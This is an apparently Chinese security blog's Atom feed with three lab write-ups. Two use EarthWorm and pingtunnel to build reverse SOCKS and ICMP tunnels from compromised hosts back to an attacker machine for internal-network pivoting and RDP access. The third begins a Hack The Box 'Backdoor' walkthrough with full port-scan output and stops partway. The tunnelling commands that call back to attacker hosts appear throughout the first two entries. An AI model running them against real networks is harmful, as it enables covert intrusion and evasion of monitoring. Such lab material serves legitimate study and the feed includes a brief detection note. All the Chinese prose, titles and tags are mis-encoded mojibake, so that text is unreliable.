<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2022-01-12T13:29:46.402Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ewçš„ä½¿ç”¨è®°å½•</title>
    <link href="https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2022-01-12T13:18:43.000Z</published>
    <updated>2022-01-12T13:29:46.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®éªŒæ‹“æ‰‘"><a href="#0x00-å®éªŒæ‹“æ‰‘" class="headerlink" title="0x00.å®éªŒæ‹“æ‰‘"></a>0x00.å®éªŒæ‹“æ‰‘</h2><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png" class><a id="more"></a><h2 id="0x01-å®éªŒä¸€"><a href="#0x01-å®éªŒä¸€" class="headerlink" title="0x01.å®éªŒä¸€"></a>0x01.å®éªŒä¸€</h2><p><strong>å½“è·å–åˆ°Bçš„æƒé™åï¼Œå¯¹Cè¿›è¡Œå®‰å…¨æµ‹è¯•</strong></p><p><code>Aæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>Bæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 114.15.xx.xx -e 8888</span><br></pre></td></tr></table></figure><p><code>ä»£ç†æµ‹è¯•</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112173653122.png" class><h2 id="0x02-å®éªŒäºŒ"><a href="#0x02-å®éªŒäºŒ" class="headerlink" title="0x02.å®éªŒäºŒ"></a>0x02.å®éªŒäºŒ</h2><p><strong>å½“è·å–åˆ°Cçš„æƒé™åå¯¹Dè¿›è¡Œå®‰å…¨æµ‹è¯•</strong></p><p><code>Aæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>Cæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p><code>Bæ‰§è¡Œï¼Œè¿æ¥A C</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 114.15.xx.xx -e 8888 -f 10.10.10.164 -g 9999</span><br></pre></td></tr></table></figure><p><code>ä»£ç†æµ‹è¯•</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112174844945.png" class><h2 id="0x03-å®éªŒä¸‰"><a href="#0x03-å®éªŒä¸‰" class="headerlink" title="0x03.å®éªŒä¸‰"></a>0x03.å®éªŒä¸‰</h2><p><strong>å½“è·å–åˆ°Dçš„æƒé™åå¯¹Eè¿›è¡Œå®‰å…¨æµ‹è¯•</strong></p><p><code>Aæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 10801 -e 8886</span><br></pre></td></tr></table></figure><p><code>Bæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 115.14.xx.xx -e 8886 -f 10.10.10.164 -g 6666</span><br></pre></td></tr></table></figure><p><code>Cæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 6666 -e 7778</span><br></pre></td></tr></table></figure><p><code>Dæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 10.10.20.128 -e 7778</span><br></pre></td></tr></table></figure><p><code>ä»£ç†æµ‹è¯•</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112204533430.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®éªŒæ‹“æ‰‘&quot;&gt;&lt;a href=&quot;#0x00-å®éªŒæ‹“æ‰‘&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®éªŒæ‹“æ‰‘&quot;&gt;&lt;/a&gt;0x00.å®éªŒæ‹“æ‰‘&lt;/h2&gt;&lt;img src=&quot;/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png&quot; class&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="éš§é“æ„å»º" scheme="https://lunamoore.github.io/tags/%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>ew+pingtunnelæ„å»ºéš§é“</title>
    <link href="https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/"/>
    <id>https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/</id>
    <published>2022-01-10T07:51:34.000Z</published>
    <updated>2022-01-12T13:29:38.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å®éªŒæ‹“æ‰‘"><a href="#0x01-å®éªŒæ‹“æ‰‘" class="headerlink" title="0x01.å®éªŒæ‹“æ‰‘"></a>0x01.å®éªŒæ‹“æ‰‘</h2><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145316199.png" class><a id="more"></a><h2 id="0x02-å®éªŒç›®çš„"><a href="#0x02-å®éªŒç›®çš„" class="headerlink" title="0x02.å®éªŒç›®çš„"></a>0x02.å®éªŒç›®çš„</h2><blockquote><p>å‡è®¾win 7å·²ç»è¢«æˆ‘ä»¬æ‹¿ä¸‹ï¼Œé€šè¿‡ä½¿ç”¨ew+pingtunnelæ„å»ºsocks5éš§é“ï¼Œéšè—tcpæµé‡ï¼Œä»è€Œè¾¾åˆ°è®¿é—®å†…ç½‘server 2021ã€‚</p></blockquote><h2 id="0x03-å®éªŒè¿‡ç¨‹"><a href="#0x03-å®éªŒè¿‡ç¨‹" class="headerlink" title="0x03.å®éªŒè¿‡ç¨‹"></a>0x03.å®éªŒè¿‡ç¨‹</h2><h3 id="01-kaliæ‰§è¡Œ"><a href="#01-kaliæ‰§è¡Œ" class="headerlink" title="01.kaliæ‰§è¡Œ"></a>01.kaliæ‰§è¡Œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -nolog 1 -noprint 1 -key 6666</span><br></pre></td></tr></table></figure><p>kaliä½œä¸ºæœåŠ¡ç«¯ç­‰å¾…è¿æ¥</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145902832.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 7777 -e 8888</span><br></pre></td></tr></table></figure><p>å°†å…¶ä»–æœºå™¨è½¬å‘åˆ°kali 8888ç«¯å£çš„æµé‡è½¬å‘è‡³kaliçš„7777ç«¯å£</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145932313.png" class><h3 id="02-win-7æ‰§è¡Œ"><a href="#02-win-7æ‰§è¡Œ" class="headerlink" title="02.win 7æ‰§è¡Œ"></a>02.win 7æ‰§è¡Œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :4444 -s 192.168.1.9 -t 192.168.1.9:8888 -key 6666 -nolog 1 -noprint 1 -sock5 -1</span><br></pre></td></tr></table></figure><p>å¼€å¯socks5ï¼Œå°†icmpéš§é“çš„æµé‡ä½¿ç”¨æœ¬åœ°4444ç«¯å£è¿›è¡Œè½¬å‘</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110150533638.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win.exe -s rssocks -d 127.0.0.1 -e 4444</span><br></pre></td></tr></table></figure><p>win 7ä½¿ç”¨4444ç«¯å£è¿›è¡Œè½¬å‘</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152130974.png" class><h3 id="03-æµ‹è¯•éš§é“æ˜¯å¦æ„å»ºæˆåŠŸ"><a href="#03-æµ‹è¯•éš§é“æ˜¯å¦æ„å»ºæˆåŠŸ" class="headerlink" title="03.æµ‹è¯•éš§é“æ˜¯å¦æ„å»ºæˆåŠŸ"></a>03.æµ‹è¯•éš§é“æ˜¯å¦æ„å»ºæˆåŠŸ</h3><p><code>æŸ¥çœ‹kaliç«¯ï¼Œå‡ºç°OKå³å¤§æ¦‚ç‡æˆåŠŸ</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152406851.png" class><p><code>ä½¿ç”¨ä»£ç†è®¿é—®server 2021</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152520341.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152543043.png" class><p><code>ä½¿ç”¨ä»£ç†ç™»å…¥3389</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152636239.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110153711738.png" class><h3 id="04-wiresharkæŠ“åŒ…æŸ¥çœ‹"><a href="#04-wiresharkæŠ“åŒ…æŸ¥çœ‹" class="headerlink" title="04.wiresharkæŠ“åŒ…æŸ¥çœ‹"></a>04.wiresharkæŠ“åŒ…æŸ¥çœ‹</h3><p><code>å¯ä»¥çœ‹åˆ°åªæœ‰icmpåè®®ï¼Œè¯æ˜æµé‡å…¨éƒ¨å°è£…åˆ°icmpéš§é“ä¸­ã€‚</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110154031923.png" class><h3 id="05-icmpéš§é“çš„é˜²èŒƒ"><a href="#05-icmpéš§é“çš„é˜²èŒƒ" class="headerlink" title="05.icmpéš§é“çš„é˜²èŒƒ"></a>05.icmpéš§é“çš„é˜²èŒƒ</h3><p>ä¸€ä¸ªæ­£å¸¸çš„pingå‘½ä»¤æ¯ç§’æœ€å¤šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨icmpéš§é“åˆ™å†å¾ˆçŸ­æ—¶é—´å†…äº§ç”Ÿä¸Šåƒä¸ªæ•°æ®åŒ…ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-å®éªŒæ‹“æ‰‘&quot;&gt;&lt;a href=&quot;#0x01-å®éªŒæ‹“æ‰‘&quot; class=&quot;headerlink&quot; title=&quot;0x01.å®éªŒæ‹“æ‰‘&quot;&gt;&lt;/a&gt;0x01.å®éªŒæ‹“æ‰‘&lt;/h2&gt;&lt;img src=&quot;/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145316199.png&quot; class&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="éš§é“æ„å»º" scheme="https://lunamoore.github.io/tags/%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Backdoor</title>
    <link href="https://lunamoore.github.io/2022/01/05/HTB-Backdoor/"/>
    <id>https://lunamoore.github.io/2022/01/05/HTB-Backdoor/</id>
    <published>2022-01-05T14:06:19.000Z</published>
    <updated>2022-01-05T14:13:49.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2022/01/05/HTB-Backdoor/image-20220105130426840.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†ç«¯å£80ï¼Œ22ï¼Œ1337</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# rustscan -a 10.10.11.125 -- -A                                                                                           130 â¨¯</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: https://discord.gg/GFrQsGy           :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">ğŸŒHACK THE PLANETğŸŒ</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">Open 10.10.11.125:22</span><br><span class="line">Open 10.10.11.125:80</span><br><span class="line">Open 10.10.11.125:1337</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] Script to be run Some(<span class="string">&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-05 01:50 EST</span><br><span class="line">NSE: Loaded 153 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 01:50</span><br><span class="line">Scanning 10.10.11.125 [4 ports]</span><br><span class="line">Completed Ping Scan at 01:50, 0.31s elapsed (1 total hosts)</span><br><span class="line">Initiating SYN Stealth Scan at 01:50</span><br><span class="line">Scanning backdoor.htb (10.10.11.125) [3 ports]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.125</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.125</span><br><span class="line">Discovered open port 1337/tcp on 10.10.11.125</span><br><span class="line">Completed SYN Stealth Scan at 01:50, 0.82s elapsed (3 total ports)</span><br><span class="line">Initiating Service scan at 01:50</span><br><span class="line">Scanning 3 services on backdoor.htb (10.10.11.125)</span><br><span class="line">Completed Service scan at 01:53, 175.46s elapsed (3 services on 1 host)</span><br><span class="line">Initiating OS detection (try #1) against backdoor.htb (10.10.11.125)</span><br><span class="line">Retrying OS detection (try #2) against backdoor.htb (10.10.11.125)</span><br><span class="line">Initiating Traceroute at 01:53</span><br><span class="line">Completed Traceroute at 01:53, 1.89s elapsed</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 01:53</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 01:53, 0.04s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">NSE: Script scanning 10.10.11.125.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:53</span><br><span class="line">Completed NSE at 01:54, 25.13s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 5.01s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">Nmap scan report for backdoor.htb (10.10.11.125)</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.98s latency).</span><br><span class="line">Scanned at 2022-01-05 01:50:23 EST for 229s</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=</span><br><span class="line">|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=</span><br><span class="line">|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca</span><br><span class="line">80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.8.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Backdoor &amp;#8211; Real-Life</span><br><span class="line">1337/tcp open  waste?  syn-ack ttl 63</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SCAN(V=7.91%E=4%D=1/5%OT=22%CT=%CU=33086%PV=Y%DS=2%DC=T%G=N%TM=61D54094%P=x86_64-pc-linux-gnu)</span><br><span class="line">SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)</span><br><span class="line">SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%TS=B)</span><br><span class="line">OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)</span><br><span class="line">WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)</span><br><span class="line">ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)</span><br><span class="line">T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)</span><br><span class="line">T2(R=N)</span><br><span class="line">T3(R=N)</span><br><span class="line">T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span><br><span class="line">T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span><br><span class="line">T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)</span><br><span class="line">IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Uptime guess: 3.355 days (since Sat Jan  1 17:23:05 2022)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   452.39 ms 10.10.16.1</span><br><span class="line">2   862.16 ms backdoor.htb (10.10.11.125)</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 230.65 seconds</span><br><span class="line">           Raw packets sent: 76 (5.268KB) | Rcvd: 60 (4.360KB)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><blockquote><p>æ·»åŠ ä¸€æ¡host    10.10.11.125    backdoor.htb</p></blockquote><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªwordpressçš„ç«™ç‚¹ï¼Œå¹¶ä¸”æ²¡æœ‰æ³„éœ²ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105132330901.png" class><h2 id="0x03-wpscanæ‰«æ"><a href="#0x03-wpscanæ‰«æ" class="headerlink" 